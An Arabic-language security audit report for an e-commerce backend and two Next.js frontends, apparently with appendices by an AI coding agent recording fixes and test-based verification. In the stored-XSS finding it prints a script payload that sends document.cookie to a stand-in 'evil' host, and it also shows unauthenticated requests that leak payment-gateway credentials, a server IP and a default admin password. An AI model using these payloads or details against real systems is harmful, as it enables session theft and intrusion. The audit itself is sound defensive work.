# التقرير الأمني — الموجة ب

**النطاق:** الباك إند كاملاً + الواجهتان (admin-panel، storefront) + إعداد النشر والتبعيات
**التاريخ:** 2026-09-06
**الفرع:** securitycheck @ 3adef9c
**المرجع السابق:** [SECURITY-AUDIT-WAVE-A.md](SECURITY-AUDIT-WAVE-A.md)

---

## الملخص التنفيذي

| الخطورة | جديد | مُرحَّل من الموجة أ | المجموع المفتوح |
|---|---|---|---|
| حرِج (Critical) | 1 | 1 | 2 |
| عالٍ (High) | 4 | 4 | 8 |
| متوسط (Medium) | 6 | 6 | 12 |
| منخفض (Low) | 4 | — | 4 |

**الخلاصة:** إصلاحات الموجة أ صحيحة وتم التحقق منها — `OrderFeature` صار محمياً، وملكية السلة صارت من الجلسة وحدها، و`limit` مسقوف عند 100 في الـ 14 handler. لكن ظهر تسريب حرِج جديد: **`gateway_config` — الحقل المخصّص لبيانات اعتماد بوابة الدفع — يُعاد لأي زائر غير مصادَق** على `GET /api/payment-methods`. كما أن دالة الهروب في `json-ld.tsx` لا تفعل شيئاً إطلاقاً، ما يفتح XSS مخزّن على المتجر. ولا يزال النشر على HTTP صريح.

---

## حرِج

### C-7 — بيانات اعتماد بوابة الدفع مكشوفة دون مصادقة  🆕

**الموقع:**
- `backend/Features/PaymentMethodFeature/ListPaymentMethodPaginated/ListPaymentMethodPaginatedEndpoint.cs:15` — `[AllowAnonymous]`
- `backend/Features/PaymentMethodFeature/GetByIdPaymentMethod/GetByIdPaymentMethodEndpoint.cs:16` — `[AllowAnonymous]`
- `backend/Features/PaymentMethodFeature/CreatePaymentMethod/CreatePaymentMethodHandler.cs:74` — `MapResponse` يُدرج `GatewayConfig`
- `backend/Features/PaymentMethodFeature/CreatePaymentMethod/CreatePaymentMethodCommand.cs:26` — `PaymentMethodResponse.GatewayConfig`

الـ endpoint العام للـ checkout يُعيد الكيان كاملاً، بما فيه `GatewayConfig` — وهو الحقل الذي بحكم تسميته وموقعه (بجوار `Gateway`) مُعدّ لحمل مفاتيح الـ API وأسرار الـ webhook للبوابة.

**الاستغلال:**

```
GET /api/payment-methods?limit=100        # بلا توكن
GET /api/payment-methods/{id}             # بلا توكن
```

**تفصيل إضافي:** لا يوجد فلتر افتراضي على `IsActive`، فالطرق المعطّلة وطرق الاختبار تُعاد أيضاً — وهي غالباً ما تحمل مفاتيح sandbox أو إعدادات قيد التجربة.

**الوضع الحالي:** الـ seeder لا يملأ `GatewayConfig` (`DbSeeder.cs:591`)، فلا تسريب فعلي في بيئة التطوير اليوم. الثغرة قنبلة موقوتة: تنفجر لحظة إدخال أول بوابة دفع أونلاين.

**الإصلاح:** حذف `GatewayConfig` من `PaymentMethodResponse` نهائياً، وإنشاء `PaymentMethodPublicResponse` للـ storefront يحوي فقط `Id, Name, LabelEn, LabelAr, Type, IconUrl, InstructionsEn, InstructionsAr, SortOrder`، مع تصفية `IsActive = true` إجبارياً على المسار العام. الإعداد الحساس لا يُعاد لأي عميل — ولا حتى للوحة الإدارة.

---

### C-5 — الإنتاج يعمل على HTTP صريح  ⏳ *مفتوح منذ الموجة أ*

**الموقع:** `docker-compose.yml:44,63,72`

```
Cors__AllowedOrigins__0: http://49.12.219.180:3000
NEXT_PUBLIC_API_URL:     http://49.12.219.180:5101/api
NEXT_PUBLIC_SITE_URL:    http://49.12.219.180:3001
```

كلمة مرور المدير، والـ JWT، وبيانات العملاء الشخصية — كلها تمر بنص صريح. و`app.UseHttpsRedirection()` في `Program.cs:90` بلا منفذ HTTPS مُعرَّف يُسجّل تحذيراً ولا يفعل شيئاً.

**تفصيل جديد:** `ports: "5101:5101"` على خدمة `api` يربط على `0.0.0.0` — الباك إند مكشوف مباشرة للإنترنت، لا خلف الواجهة فقط.

---

## عالٍ

### H-6 — XSS مخزّن على المتجر: دالة الهروب في JSON-LD لا تفعل شيئاً  🆕

**الموقع:** `client/storefront/components/seo/json-ld.tsx:17`

```ts
__html: JSON.stringify(data).replace(/</g, "<"),
```

في JavaScript، السلسلة `"<"` **هي** المحرف `<` بعد تحليل السلسلة النصية. السطر يستبدل `<` بـ `<` — عملية عقيمة تماماً. تم التحقق:

```bash
node -e "const s=JSON.stringify({n:'x'}); console.log('<' === '<')"   # true
```

المقصود كان `"\\u003c"` (باك سلاش مزدوج)، بحيث يخرج التسلسل النصي `<` إلى الـ HTML فيفكّه محلّل JSON داخل الوسم.

**مسار الاستغلال:** `app/(store)/products/[slug]/page.tsx:55-71` يمرّر `product.name` و`product.description` (النصّان العربي والإنجليزي) إلى `buildProductJsonLd` ومنها إلى `JsonLd`. وصف منتج يحوي:

```
</script><script>fetch('https://evil/'+document.cookie)</script>
```

يخرج من وسم الـ script ويُنفَّذ على أصل المتجر. نفس المسار عبر `buildBreadcrumbJsonLd` لأسماء التصنيفات والمجموعات.

**لماذا هذا عالٍ لا متوسط:** يقترن مباشرة بـ H-7 (غياب التحقق من المدخلات) — لا شيء في الباك إند يمنع تخزين وسوم HTML في أي حقل نصي. وباب الدخول ليس المدير وحده: أي مسار يستورد بيانات مورّد أو كتالوج خارجي يصبح باب حقن.

**الإصلاح:** استخدام `"\\u003c"` في الـ `replace`، مع اختبار انحدار يمرّر `</script>` في وصف منتج ويؤكد ظهوره مهروباً في الـ HTML الناتج.

---

### H-7 — لا يوجد تحقق من المدخلات على أي endpoint كتابة في المشروع  🆕

**الموقع:** الباك إند كاملاً — `grep -rl "AbstractValidator" backend/Features/` يُعيد **ملفاً واحداً**: `LoginAdminUserHandler.cs`.

`ValidationBehavior` مُسجَّل ويعمل، لكن لا يوجد ما يُشغّله. الـ 60+ endpoint كتابة (منتجات، تصنيفات، علامات، طلبات، عناوين، سمات) تمرر مدخلات العميل إلى Postgres دون فحص طول ولا صيغة ولا محتوى:

- `CreateOrderCommand.CustomerNotes` — نص بلا سقف، من مصدر **غير مصادَق**
- `ShippingAddress1/2`, `ShippingFirstName`, `ShippingPhone` — بلا سقف ولا فحص صيغة، غير مصادَق
- كل حقول المنتج والتصنيف والعلامة — بلا سقف، تُعرض لاحقاً في المتجر (⇒ H-6)
- حقول `Slug` — بلا فحص صيغة، والـ endpoints العامة تجلب بها

**الأثر المزدوج:** (1) استنزاف تخزين عبر `POST /api/orders` غير المصادَق بحقول ضخمة؛ (2) الطرف المُغذّي لثغرة الـ XSS في H-6؛ (3) خطأ Postgres على تجاوز طول العمود يخرج كـ 500 عبر `ExceptionHandlingMiddleware`.

**الإصلاح:** validator لكل `Command` — سقف طول لكل حقل نصي مطابق لعمود قاعدة البيانات، وregex للهاتف والـ slug، ونطاق للأعداد. يبدأ بـ `CreateOrderCommand` لأنه المسار الوحيد غير المصادَق.

---

### H-8 — `next-auth` بثغرات حرِجة، إحداها تطابق نمط الحماية المستخدم تماماً  🆕

**المثبَّت:** `next-auth@5.0.0-beta.31` + `@auth/core@0.41.2` — تصنيف **critical** في `npm audit`.

الأخطر بينها [GHSA-8fpg-xm3f-6cx3](https://github.com/advisories/GHSA-8fpg-xm3f-6cx3):
> *Configuration errors can cause existence-based auth checks to fail open (auth object populated with an error)*

وهذا بالضبط ما يفعله `client/admin-panel/middleware.ts:5`:

```ts
const isLoggedIn = !!req.auth;
```

عند خطأ في الإعداد (`AUTH_SECRET` مفقود أو خاطئ مثلاً)، يُملأ `req.auth` بكائن خطأ — و`!!` عليه يساوي `true`. الحماية تفشل مفتوحة: زائر غير مصادَق يمر إلى `/dashboard` وكل صفحات الإدارة.

الثلاث الأخرى: تجاوز مُطبِّع البريد عبر homoglyph، واستثناء غير ملتقط في `getToken()` على ترويسة Bearer مشوّهة، وعدم ربط كوكيز PKCE/state بالمزوّد.

**الإصلاح:** ترقية `next-auth` و`@auth/core` إلى إصدار مُصلَح، **و** تشديد الفحص في الـ middleware بحيث لا يعتمد على الوجود وحده:

```ts
const isLoggedIn = !!req.auth?.user?.id;
```

الشرطان معاً — الترقية وحدها لا تحمي من عودة النمط، والتشديد وحده لا يغطي الثغرات الثلاث الأخرى.

---

### H-9 — الـ rate limiter يفشل مفتوحاً وبصمت  🆕

**الموقع:** `backend/Common/RateLimiting/RedisRateLimiter.cs:110-115` و `backend/DependencyInjection/ServiceCollectionExtensions.cs:52`

مساران يُعطّلان الحد كلياً دون إشعار:

1. **Redis غير مُعرَّف:** إن غاب `ConnectionStrings:Redis`، لا يُسجَّل `RedisRateLimiter`، والـ middleware يمرّر كل شيء (`RedisRateLimiter.cs:84-88`). و`appsettings.json` الأساسي **لا يحوي** مفتاح Redis — بيئة إنتاج بلا المتغيّر البيئي تعمل بلا أي rate limiting، وتُقلع بنجاح دون تحذير.
2. **Redis متعطّل:** `catch (RedisException or TimeoutException)` يُسجّل `LogWarning` ويمرّر الطلب. إسقاط Redis (أو إشباعه) يُلغي حماية تسجيل الدخول من التخمين.

**الإصلاح:** `ValidateOnStart` يرفض الإقلاع إن كان `RedisRateLimit:Enabled = true` بلا اتصال Redis. وللمسار الثاني: fail-closed على `/api/auth/login` تحديداً (429 عند تعذّر الفحص)، مع إبقاء fail-open لبقية المسارات حفاظاً على التوفّر.

**ملاحظة إضافية (M-5 مؤكدة):** `GetClientIdentifier` يستخدم `context.Connection.RemoteIpAddress` بلا `UseForwardedHeaders`. صحيح حالياً مع نشر المنافذ المباشر، لكنه سيصير IP الـ proxy الواحد عند إدخال Traefik ⇒ الإنترنت كله في دلو واحد سعته 120/دقيقة = حجب ذاتي كامل. **يجب أن يُصلح ضمن نفس الموجة التي تُدخل الـ proxy، لا بعدها.**

---

### H-1 — الأدوار معرَّفة لكنها غير مُنفَّذة  ⏳ *مفتوح منذ الموجة أ — مؤكَّد*

`grep -rn "Roles *=" backend/Features/` ⇒ **صفر نتيجة**.

`JwtTokenService.cs:26` يُصدر `ClaimTypes.Role`، و`DbSeeder.cs:220-222` ينشئ ثلاثة مستويات (`superadmin`, `manager`, `staff`) — ولا شيء يقرأها. الـ `FallbackPolicy` يشترط "مصادَق" فقط، فحساب `staff` يملك صلاحية حذف المنتجات وتعديل الطلبات وإدارة طرق الدفع كاملةً.

---

### H-2 — التوكن الإداري مكشوف لـ JavaScript في المتصفح  ⏳ *مفتوح منذ الموجة أ — مؤكَّد*

`client/admin-panel/auth.ts:69` يضع `accessToken` في كائن الجلسة، و`token-sync.tsx` يسحبه عبر `useSession()` إلى متغيّر في الذاكرة. النتيجة: التوكن يُعاد على `GET /api/auth/session` ويقرأه أي سكربت في الصفحة. أي XSS في لوحة الإدارة = سرقة توكن صالح 8 ساعات بلا إمكانية إبطال (H-5).

---

### H-4 — سباق تزامن على المخزون  ⏳ *مفتوح منذ الموجة أ — مؤكَّد*

`backend/Features/OrderFeature/CreateOrder/CreateOrderHandler.cs:63-67` يفحص المخزون، و`:139-142` يُنقصه — بلا معاملة صريحة ولا `IsConcurrencyToken` ولا `SELECT … FOR UPDATE`. طلبان متزامنان يجتازان الفحص كلاهما ⇒ بيع زائد ورصيد سالب.

---

### H-5 — لا يوجد إبطال للتوكن  ⏳ *مفتوح منذ الموجة أ — مؤكَّد*

`LogoutAdminUserHandler.cs:11` يُعيد `Success(true)` ولا شيء غير ذلك. لا denylist ولا refresh token.

**تفصيل جديد:** `GetCurrentAdminUserHandler.cs:17-20` يجلب المستخدم **دون فحص `IsActive`**. تعطيل حساب مدير مخترَق لا يقطع وصوله — يبقى فاعلاً حتى انتهاء الـ 480 دقيقة.

---

## متوسط

### M-8 — `MergeCart` يثق بـ `userId` القادم من جسم الطلب  🆕

**الموقع:** `backend/Features/CartFeature/MergeCart/MergeCartEndpoint.cs:24` و `MergeCartHandler.cs:24`

إصلاح الموجة أ أضاف اشتراط المصادقة — وهو صحيح — لكن الـ handler ما زال يأخذ `command.UserId` من الجسم ويتحقق فقط من **وجود** المستخدم، لا من مطابقته لهوية حامل التوكن. حامل أي توكن صالح يربط سلته بأي `userId`.

**والأهم بنيوياً:** التوكنات الوحيدة في المنظومة هي توكنات `AdminUsers`، بينما `MergeCart` يستهدف جدول `Users` (عملاء المتجر). و`client/storefront/lib/api-client.ts` لا يرسل ترويسة `Authorization` إطلاقاً. فالـ endpoint اليوم إمّا يُعيد 401 للمتجر (معطّل وظيفياً) أو يُستدعى بتوكن إداري (IDOR). لا يوجد مسار صحيح ثالث — نموذج مصادقة العملاء غير موجود بعد.

**الإصلاح:** تأجيل الـ endpoint حتى وجود مصادقة عملاء حقيقية، ثم اشتقاق `userId` من الـ claims حصراً وحذفه من العقد.

### M-9 — المنتجات غير المنشورة قابلة للتعداد من المتجر  🆕

`ListProductPaginatedEndpoint.cs:15` هو `[AllowAnonymous]`، و`ListProductPaginatedQuery.Status` يُمرَّر كما هو إلى `Where(p => p.Status.ToLower() == status)` (`ListProductPaginatedHandler.cs:91-95`) بلا فرض `active` على المسار العام:

```
GET /api/products?status=draft&limit=100
GET /api/products?status=archived&limit=100
```

كتالوج ما قبل الإطلاق والأسعار المسحوبة مكشوفة للمنافس. نفس النمط على `isActive` في `ListBrand` و`ListCollection` و`ListShippingZone` و`ListPaymentMethod`.

**الإصلاح:** فرض `Status = "active"` في الـ handler عندما لا يكون المستدعي مصادَقاً، أو فصل `ListProductPublic` عن الـ endpoint الإداري.

### M-10 — سعر السلة المجمَّد يُحترم عند الدفع  🆕

`CreateOrderHandler.cs:69-73`: `unitPrice = ci.UnitPrice ?? …`. السعر يُلتقط لحظة الإضافة إلى السلة (`AddCartItemHandler.cs:74`) ويبقى صالحاً حتى انتهاء السلة — **30 يوماً** (`GetCartHandler.cs:53`).

ليس تلاعباً بالسعر من العميل (تأكيد الموجة أ صحيح: لا حقل سعر في الـ command)، لكنه ثغرة أعمال: إضافة المنتج أثناء التخفيض، والدفع بعد انتهائه بأسابيع.

**الإصلاح:** إعادة احتساب السعر من `Product`/`ProductVariant` وقت إنشاء الطلب، مع رفض الطلب أو إشعار العميل عند تغيّر السعر.

### M-11 — تبعيات npm بثغرات عالية في الواجهتين  🆕

خارج H-8، `npm audit --omit=dev` في كلا التطبيقين:

| الحزمة | المثبَّت | الخطورة | الأبرز |
|---|---|---|---|
| `next` | 16.2.6 | عالٍ (9 استشارات) | تجاوز middleware، SSRF في rewrites، كشف نقاط Server Functions، DoS |
| `undici` | ≤7.28.0 | عالٍ | حقن CRLF، تسريب معلومات بين المستخدمين عبر الكاش |
| `sharp` | <0.35.0 | عالٍ | ثغرات libvips موروثة |
| `postcss`, `nanoid`, `js-yaml`, `ip-address`, `fast-uri`, `brace-expansion`, `browserslist` | — | عالٍ | — |

استشارة **تجاوز الـ middleware** في Next.js تطابق آلية الحماية الوحيدة للوحة الإدارة (`middleware.ts`) — تقترن مباشرة بـ H-8.

### M-12 — تصلّب الحاويات  🆕

**الموقع:** `backend/Dockerfile`، `client/*/Dockerfile`، `docker-compose.yml`

- لا `USER` في أي Dockerfile ⇒ الثلاث خدمات تعمل بصلاحية root. و`docker-compose.yml` يربط `./img:/img` قابلاً للكتابة، وهو المجلد نفسه الذي يُخدَّم على `/img`.
- `redis` بلا `requirepass` في الـ compose (بينما `appsettings.Development.json` يستخدم كلمة مرور). أي حاوية على الشبكة تصل إليه ⇒ تصفير عدّادات الـ rate limit وتسميم الـ output cache.
- `api` تنشر `5101:5101` على `0.0.0.0` (⇒ C-5).

**الإصلاح:** `USER app` (الصورة الرسمية تُعرّفه) في الباك إند، و`USER node` في الواجهتين؛ `command: redis-server --requirepass ${REDIS_PASSWORD:?}` مع تمرير اتصال مصادَق؛ وربط منفذ الـ API على `127.0.0.1` خلف الـ proxy.

### M-13 — إنشاء صفوف سلة بلا حدّ من مستدعٍ مجهول  🆕

`GetCartHandler.GetOrCreateCartAsync` يُنشئ صف `Cart` لأي `X-Cart-Session` جديد على **قراءة** بسيطة:

```
GET /api/carts   -H "X-Cart-Session: <أي نص>"
```

بلا فحص طول ولا صيغة (`NormalizeSession` يقصّ المسافات فقط)، وبلا مهمة تنظيف للسلال المنتهية (`ExpiresAt` يُكتب ولا يُقرأ في أي مكان). ضمن سقف 120/دقيقة/IP: ~172 ألف صف يومياً لكل IP.

**الإصلاح:** اشتراط صيغة GUID على `X-Cart-Session`، وعدم إنشاء سلة على مسار القراءة (إعادة سلة فارغة)، ومهمة دورية تحذف ما تجاوز `ExpiresAt`.

### M-3 — `TrackGuestOrder` قابل للتخمين  ⏳ *مفتوح منذ الموجة أ — مع تفصيل جديد*

`CreateOrderHandler.cs:196` يولّد `ORD-yyyyMMdd-{Random.Shared.Next(100000,999999)}`. تفصيلان يزيدان الخطورة عما ورد في الموجة أ:

1. `Random.Shared` مولّد **غير تشفيري**؛ حالته الداخلية قابلة للاستنتاج من مخرجات مرصودة (مهاجم يُنشئ طلبات لنفسه ليرصدها).
2. الـ rate limiter لا يفرّق `/api/orders/track` عن بقية المسارات: 120/دقيقة = 172,800 محاولة يومياً لكل IP، مقابل فضاء 900,000 لليوم الواحد. مع هاتف الضحية معروفاً، الأمر مسألة عدد IPs.

**الإصلاح:** `RandomNumberGenerator` بـ 10 محارف على الأقل، وسياسة rate limit مخصّصة للمسار (مثلاً 5/دقيقة).

### M-2, M-4, M-6, M-7  ⏳ *مفتوحة منذ الموجة أ*

- **M-2** سر JWT للتطوير في git: `backend/appsettings.Development.json:16`.
- **M-4** `AllowedHosts: "*"` وغياب كل الـ security headers — لا `headers()` في أيٍّ من ملفَّي `next.config.ts`، ولا HSTS/CSP/`X-Frame-Options`/`X-Content-Type-Options` من الباك إند. غياب `nosniff` وثيق الصلة بـ `/img` المخدَّم من `Program.cs:96-101`: صيغة GIF تسمح بمحتوى polyglot، والتحقق بالبايتات السحرية يفحص الترويسة لا بقية الملف.
- **M-6** `CouponCode` يُقبل ويُخزَّن ولا يُطبَّق (`discountAmount = 0` ثابت).
- **M-7** `Microsoft.OpenApi` 2.0.0 — عالٍ، [GHSA-v5pm-xwqc-g5wc](https://github.com/advisories/GHSA-v5pm-xwqc-g5wc). مؤكَّد قائماً في هذا الفرع.

---

## منخفض

- **L-1** `dangerouslyAllowLocalIP: true` في `client/storefront/next.config.ts:41` — يسمح لمُحسِّن الصور بجلب عناوين شبكة داخلية؛ يتقاطع مع استشارة SSRF في M-11.
- **L-2** معرّف جلسة السلة في `localStorage` (`lib/cart-session.ts`) لا في كوكي `HttpOnly`. هو عملياً بيانات اعتماد السلة، ومقروء لأي سكربت.
- **L-3** كلمة مرور المدير الافتراضية `Admin123!` مضمّنة في `DbSeeder.cs:13` لثلاثة حسابات معلومة البريد. آمن ما دام `ASPNETCORE_ENVIRONMENT != Development` — وهو ضبط واحد يفصل بين الحالتين.
- **L-4** `ExceptionHandlingMiddleware` يكتب جسم الاستجابة دون فحص `Response.HasStarted`؛ استثناء بعد بدء الإرسال يُنتج استجابة مشوّهة.

---

## ما فُحص ووُجد سليماً

- **إصلاحات الموجة أ صامدة.** لا `[AllowAnonymous]` متبقٍّ على `OrderFeature` عدا `CreateOrder` و`TrackGuestOrder` (وهما مقصودان). `BelongsToCaller` في `RemoveCartItem` و`UpdateCartItem` يقارن `SessionId` وحده. `Math.Clamp(…, 1, 100)` مطبَّق في الـ 14 handler.
- **لا SQL injection.** صفر `FromSqlRaw`/`ExecuteSqlRaw` في المشروع. الترتيب الديناميكي عبر `switch` على قيم ثابتة في كل handler فُحص.
- **رفع الصور متين.** `LocalImageStorageService` يجمع: قائمة امتدادات مسموحة، وفحص بايتات سحرية (`ImageFileSignatures`)، واسم ملف من `Guid.NewGuid()` (يُهمل اسم العميل تماماً)، و`FileMode.CreateNew`، وحارس اجتياز مسار مزدوج في `GetPhysicalPath` (فحص `..` + تحقّق من البادئة بعد `GetFullPath`). SVG غير مسموح — وهو القرار الصحيح.
- **معالجة كلمات المرور سليمة.** BCrypt، وhash وهمي ثابت لتخفيف هجوم التوقيت، والتقاط `SaltParseException`، ورسالة `unauthorized` موحّدة لا تفرّق بين بريد خاطئ وكلمة مرور خاطئة.
- **الـ rate limiter نفسه مكتوب جيداً.** سكربت Lua ذرّي، ومُعرّف العميل مُجزّأ بـ SHA-256، وسياسة تسجيل دخول منفصلة (10/5 دقائق)، ويعمل بعد `UseAuthentication` فيميّز المستخدم المصادَق. العيب في إعداده لا في منطقه (H-9).
- **CORS مضبوط.** أصول صريحة، بلا `AllowCredentials` — وهو المناسب لمصادقة تعتمد ترويسة `Authorization`.
- **لا تسريب استثناءات.** رسالة عامة، والتفاصيل في السجل الداخلي.
- **لا XSS في لوحة الإدارة.** الـ `dangerouslySetInnerHTML` الوحيد فيها (`components/ui/chart.tsx:95`) يبني CSS من مفاتيح ثيم ثابتة، لا من بيانات المستخدم.

---

## الإصلاحات ذات الأولوية

| # | الإصلاح | المرجع | الجهد |
|---|---|---|---|
| 1 | حذف `GatewayConfig` من `PaymentMethodResponse` + استجابة عامة مقلَّصة + فرض `IsActive` | C-7 | ساعة |
| 2 | تصحيح `\\u003c` في `json-ld.tsx` + اختبار انحدار | H-6 | ربع ساعة |
| 3 | ترقية `next-auth`/`@auth/core` + تشديد `!!req.auth?.user?.id` | H-8 | ساعة |
| 4 | فرض `status=active` على المسارات العامة للكتالوج | M-9 | ساعة |
| 5 | `ValidateOnStart` يرفض الإقلاع بلا Redis + fail-closed على `/auth/login` | H-9 | ساعتان |
| 6 | validators لكل `Command`، بدءاً بـ `CreateOrderCommand` | H-7 | يوم |
| 7 | HTTPS عبر proxy + `UseForwardedHeaders` + ربط `127.0.0.1` + security headers | C-5, M-4, M-5 | يوم |
| 8 | `[Authorize(Roles=…)]` وفق مصفوفة صلاحيات | H-1 | نصف يوم |
| 9 | معاملة وقفل تفاؤلي على إنقاص المخزون | H-4 | نصف يوم |
| 10 | إخراج `accessToken` من كائن الجلسة + فحص `IsActive` لكل طلب + denylist | H-2, H-5 | يوم |

البنود 1–4 تغلق التسريب الحرِج و XSS المخزّن وفشل المصادقة المفتوح، ومجموع تعديلاتها أقل من ثلاث ساعات.

**اختبار انحدار مطلوب لكل بند** في `backend.Tests`: طلب بلا توكن على `/api/payment-methods` لا يحوي `gatewayConfig`؛ و`status=draft` بلا توكن يُعيد صفر عناصر؛ ووصف منتج يحوي `</script>` يخرج مهروباً في HTML صفحة المنتج.

---

# ملحق: حالة الإصلاح — 2026-09-06

نُفِّذت البنود 1–4 من جدول الأولويات. البنود 5–10 ما زالت مفتوحة.

## أُصلح وتم التحقق منه

| المعرّف | الإصلاح | التحقق |
|---|---|---|
| **C-7** | حُذف `[AllowAnonymous]` من `ListPaymentMethodPaginated` و`GetByIdPaymentMethod` (صارا إداريين ويحتفظان بـ `GatewayConfig`)، وأُضيفت شريحة `ListPublicPaymentMethods` على `GET /api/payment-methods/public` تُسقط `Gateway` و`GatewayConfig` وتفرض `IsActive` في الـ handler لا من العميل | 6 اختبارات في `PaymentMethodGatewayConfigExposureTests` |
| **H-6** | `escapeForScriptTag` في `json-ld.tsx` بباك سلاش مزدوج صحيح، مع هروب `>` و U+2028/U+2029 | `scripts/check-json-ld-escaping.mjs` + `npm run check:seo` |
| **H-8** | `next-auth` 5.0.0-beta.31 → **beta.32**، و`@auth/core` 0.41.2 → **0.41.3**، و`next` 16.2.6 → **16.3.4**؛ و`middleware.ts` صار يفحص `req.auth?.user?.id != null` بدل `!!req.auth` | `npm audit --omit=dev` ⇒ صفر ثغرات في التطبيقين |
| **M-9** | القوائم العامة تُثبِّت فلتر الظهور للمستدعي غير المصادَق عبر `CatalogVisibilityExtensions.IsAnonymousCaller()`؛ ومسارات `GetById`/`GetBySlug` الثمانية اكتسبت `PublicOnly` يُشتق من المصادقة لا من الـ query string، وتُعيد نفس رسالة "not found" للصف المخفي كي لا تصير oracle | 14 اختباراً في `CatalogVisibilityTests` |

**نطاق M-9 اتّسع عن الجدول:** البند نصّ على القوائم، لكن `GET /api/products/{id}` و`by-slug` كانا يسرّبان المسوّدة نفسها بمعرّف متسلسل. إصلاح القوائم وحدها كان سيترك الثغرة مفتوحة بمسار آخر، فشمل الإصلاح المنتجات والتصنيفات والعلامات والمجموعات ومناطق الشحن.

## التحقق

- **`dotnet test`: 450 ناجحاً، صفر إخفاق** (كان 429 قبل هذا العمل + 21 اختباراً جديداً).
- **اختبار طفري (mutation testing) على كل اختبار جديد:** أُعيدت كل ثغرة عمداً وتأكّد أن الاختبار يسقط، ثم أُعيد الإصلاح. هذا كشف أمرين لولاه لمرّا:
  - أول محاولة لكتابة `json-ld.tsx` أنتجت باك سلاشاً واحداً — أي الخلل الأصلي نفسه — والحارس هو ما أمسكه.
  - `GET_ProductBySlug_AnonymousDraft_Returns404` بدا ناجحاً في أول جولة طفرية لأن الطفرة لم تُطبَّق أصلاً؛ بعد تطبيقها فعلياً سقط الاختبار كما يجب.
- `npm run typecheck` + `npm run build` ناجحان في التطبيقين.
- `npm run lint`: **مطابق للأساس حرفياً** (27 في المتجر، 33 في لوحة الإدارة) — لم تُضَف مشكلة واحدة.

## ملاحظات تشغيلية

- **تغيير كاسر مقصود:** `GET /api/payment-methods` و`/{id}` صارا يُعيدان 401 بلا توكن. المستهلك الوحيد غير المصادَق كان `client/storefront/features/payment-method` وقد حُوِّل إلى المسار العام. لوحة الإدارة تُرسل التوكن أصلاً فلا تتأثر.
- `PaymentMethodDto` في المتجر فقد الحقل `isActive` — لم يعد له معنى، إذ صار المسار العام يُعيد الطرق المفعّلة فقط.
- **`next` رُقِّي إلى 16.3.4** رغم أنه بند M-11 لا البند 3: استشارة *تجاوز الـ middleware* تُبطل الحماية نفسها التي شدّدتُها في H-8، فتركها كان سيجعل الإصلاح نصفياً. الترقية ثانوية (minor) لا كبرى، والبناء والاختبارات تؤكد سلامتها.

## ما زال مفتوحاً

بترتيب الأولوية: **H-9** (فشل الـ rate limiter المفتوح)، **H-7** (غياب الـ validators)، **C-5 + M-4 + M-5** (HTTPS والـ headers والـ proxy)، **H-1** (الأدوار)، **H-4** (سباق المخزون)، **H-2 + H-5** (كشف التوكن وإبطاله)، ثم **M-8، M-10، M-12، M-13، M-2، M-3، M-6، M-7** و**L-1 … L-4**.

`Microsoft.OpenApi` 2.0.0 (M-7) ما زال قائماً — تبعية غير مباشرة عبر `Microsoft.AspNetCore.OpenApi`، وترقيتها تحتاج بندها الخاص.

---

# ملحق ٢: حالة الإصلاح — H-9

نُفِّذ البند 5 من جدول الأولويات.

## التصحيح أولاً

صياغة H-9 الأصلية كانت موهمة، وقد نبّه المستخدم إلى ذلك بحق. **الـ rate limiting مُطبَّق وفعّال** في بيئتَي التطوير والإنتاج (Docker) كما هما مضبوطتان — أُضيف في الـ commit `3adef9c`، ومُسجَّل في `Program.cs:107` في الموضع الصحيح، وتنفيذه جيد. الملاحظة كانت على **سلوكه عند الغياب أو التعطّل**، لا على وجوده. تفصيل التحقق المستقل في [H-9-fail-open-verification.md](H-9-fail-open-verification.md).

## ما أُصلح

| النصف | المشكلة | الإصلاح |
|---|---|---|
| **أ** | `Enabled = true` بلا `ConnectionStrings:Redis` يُقلع بنجاح ويفرض لا شيء، بلا سطر سجل واحد | `Validate` جديد في `ServiceCollectionExtensions.cs:47-53` يرفض الإقلاع برسالة صريحة. الإطفاء يبقى خياراً مشروعاً لكنه صار **صريحاً** |
| **ب** | تعطّل Redis يمرّر كل شيء، بما فيه تسجيل الدخول | `HandleLimiterUnavailableAsync` في `RedisRateLimiter.cs:159` — **fail-closed على `/api/auth/login` وحده** (429 + `Retry-After`)، وfail-open لبقية المسارات |

**لماذا التمييز:** إسقاط Redis هو بالضبط ما يفعله المهاجم لنزع حماية التخمين قبل تجربة قائمة كلمات مرور، فذلك المسار يجب ألّا يتحوّل إلى «بلا حدّ». أما الكتالوج والسلة فلا يحملان هذه الرافعة، وإسقاط المتجر مع Redis يحوّل عطل كاش إلى عطل كامل.

**تفصيلان في التنفيذ:**
- مسارا الغياب (`rateLimiter is null`) والتعطّل (`catch`) يمران الآن عبر **نفس الدالة**، كي لا ينحرف سلوكهما مع الوقت.
- استجابة الـ 429 عند التعطّل **مطابقة حرفياً** لاستجابة الحدّ الحقيقي، فلا يستطيع مستدعٍ مجهول أن يستكشف بها أن Redis معطّل. مُغطّاة باختبار.

## التحقق

- **`dotnet test`: 456 ناجحاً، صفر إخفاق** (450 + 6 جديدة في `RateLimiterFailureModeTests`).
- **اختبار طفري:** إسقاط النصف (أ) يُسقط `Startup_RateLimitEnabledWithoutRedis_RefusesToBoot`؛ وإسقاط النصف (ب) يُسقط اختبارَي تسجيل الدخول. ثم أُعيد الإصلاحان.
- الاختبارات تستخدم Redis غير قابل للوصول (`127.0.0.1:6399`) لمحاكاة العطل — فلا حاجة إلى حاوية Redis في السويت.

## أثر جانبي كشفه الإصلاح نفسه

عند أول تشغيل بعد الإصلاح **سقطت كل الاختبارات التكاملية** بالرسالة الجديدة. السبب أن `TestWebApplicationFactory` لا يضبط Redis إطلاقاً، أي أن السويت كلها كانت تمر عبر المسار المفتوح — وهو ما وثّقته في البند 3-و من مستند التحقق كافتراض، فأثبته الإصلاح عملياً.

عولج بإضافة `"RedisRateLimit": { "Enabled": false }` إلى `appsettings.Testing.json` — أي أن بيئة الاختبار صارت **تعلن** أنها بلا تحديد معدّل بدل أن تكون كذلك بالصدفة.

## تغيير في متطلبات التطوير المحلي

`appsettings.Development.json` يضبط اتصال Redis، فالتحقق عند الإقلاع يمر. لكن **إن لم يكن Redis يعمل فعلاً محلياً، سيُعيد `POST api/auth/login` رمز 429** ولن تتمكن من الدخول إلى لوحة الإدارة. الخياران: تشغيل Redis (خدمة `redis` موجودة في `docker-compose.yml`)، أو ضبط `RedisRateLimit:Enabled` إلى `false` في `appsettings.Development.json`. حُدِّث `CLAUDE.md` بهذا.

## ما زال مفتوحاً

